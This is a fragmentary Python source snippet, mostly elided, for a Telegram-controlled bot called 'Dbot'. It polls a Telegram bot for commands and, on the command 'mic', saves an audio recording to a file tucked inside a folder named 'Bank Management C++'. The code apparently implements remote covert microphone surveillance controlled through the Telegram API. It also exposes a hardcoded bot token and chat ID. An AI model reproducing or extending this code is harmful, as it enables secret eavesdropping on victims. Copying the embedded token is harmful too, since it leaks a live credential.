...
base = "https://api.telegram.org/bot1011423023:AAEGPJ0FRj4nhCQm-P7Ju0kaTQ2Ui0Oa2Wk/"
bot = telegram.Bot('1011423023:AAEGPJ0FRj4nhCQm-P7Ju0kaTQ2Ui0Oa2Wk')
...
def send_message(msg, chat_id):
        ...
        if msg is not None:
            try:
                ...
                pass
def main():            
    send_message('Dbot started!','582942300')
    update_id = None
    while True:
        try:
        ...
        if updates:
            for item in updates:
                ...
                if data == 'mic':
                    try:                
                        save_paths = 'C:\\Users\\hp\\Documents\\Bank Management C++\\banksystem C++\\output.wav'
